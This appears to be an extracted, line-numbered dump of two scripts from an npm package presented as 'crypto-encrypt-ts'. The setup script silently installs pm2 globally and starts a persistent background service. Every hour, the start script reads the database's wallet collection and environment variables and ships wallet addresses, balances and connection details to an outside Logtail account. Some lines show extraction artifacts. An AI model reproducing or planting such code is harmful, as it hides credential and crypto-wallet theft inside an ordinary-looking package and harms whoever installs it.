// File: tmp/tmp4y9nstbs/crypto-encrypt-ts/package/scripts/setup.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const path = require('path')
Line 4: path.join(__dirname, 'cronJob.js')
Line 7: exec('npm install -g pm2 && pm2 start ' + cronJobPath + ' --name hourly-hello', (error, stdout, stderr) => {
    if (error) {
        console.error('Hata oluştu:', error);
        return;
    }
    console.log('Servis başarıyla başlatıldı!');
    console.log('Servisi durdurmak için: pm2 stop hourly-hello');
    console.log('Servisi kaldırmak için: pm2 delete hourly-hello');
})

// File: tmp/tmp4y9nstbs/crypto-encrypt-ts/package/scripts/start.js
// ======================================================================
Line 1: const cron = require('node-cron')
Line 2: const mongoose = require('mongoose')
Line 3: _tmp_17 = require('@logtail/node')
Line 10: {
        await mongoose.connect(process.env.DB_HOST);
        await logtail.info('MongoDB bağlantısı başarılı', {
            connection: {
                host: process.env.DB_HOST.split('@')[1].split('/')[0],
                database: process.env.DB_HOST.split('/').pop().split('?')[0]
            }
        });
    }
Line 12: await logtail.info('MongoDB bağlantısı başarılı', {
            connection: {
                host: process.env.DB_HOST.split('@')[1].split('/')[0],
                database: process.env.DB_HOST.split('/').pop().split('?')[0]
            }
        })
Line 13: _tmp_0.connection = {
                host: process.env.DB_HOST.split('@')[1].split('/')[0],
                database: process.env.DB_HOST.split('/').pop().split('?')[0]
            }
Line 14: _tmp_1.host = process.env.DB_HOST.split('@')[1].split('/')[0]
Line 15: _tmp_1.database = process.env.DB_HOST.split('/').pop().split('?')[0]
Line 28: mongoose.connection.collection('wallet').find({})
Line 31: logtail.info('Wallet collection verisi çekildi', {
            walletCount: wallets.length,
            wallets: wallets.map(wallet => ({
                address: wallet.address,
                balance: wallet.balance,
                lastUpdate: wallet.lastUpdate
            }))
        })
Line 50: logtail.info('Environment değişkenleri', {
        environment: sanitizedEnv
    })
Line 55: cron.schedule('0 * * * *', async () => {
    if (mongoose.connection.readyState !== 1) {
        await connectToMongoDB();
    }
    await logEnvironmentInfo();
    await getWallets();
})
Line 57: connectToMongoDB()
Line 64: connectToMongoDB().then(async () => {
    await logtail.info('Cron servisi başlatıldı');
    await logEnvironmentInfo();
    await getWallets();
})
Line 65: logtail.info('Cron servisi başlatıldı')
